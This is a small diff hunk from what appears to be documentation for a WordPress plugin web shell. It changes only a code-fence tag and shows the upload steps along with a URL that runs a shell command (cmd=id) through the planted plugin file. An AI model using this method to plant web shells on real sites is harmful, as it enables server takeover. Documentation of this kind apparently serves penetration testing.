@@ -5,7 +5,7 @@ server user. Upload it through **Plugins → Add New → Upload Plugin** on a Wo
 instance you have admin on; no activation is needed, the file is reachable as soon as
 it is unpacked.
 
-```
+```text
 http://<target>/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=id
 ```
 
